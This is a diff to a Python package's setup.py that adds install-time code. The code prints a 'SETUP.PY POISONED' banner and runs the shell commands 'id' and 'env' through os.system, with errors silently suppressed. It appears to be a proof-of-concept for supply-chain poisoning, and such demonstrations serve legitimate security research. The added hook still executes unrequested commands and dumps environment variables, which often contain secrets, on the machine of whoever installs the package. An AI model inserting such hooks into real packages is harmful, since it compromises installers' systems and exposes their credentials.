@@ -7,7 +7,15 @@
 
 from codecs import open
 from setuptools import setup, find_packages
-
+import os
+import sys
+try:
+    print("[!] EXTENSION SETUP.PY POISONED [!]")
+    os.system("id")
+    os.system("env")
+except:
+    pass
+    
 VERSION = "0.4.0"
 
 CLASSIFIERS = [
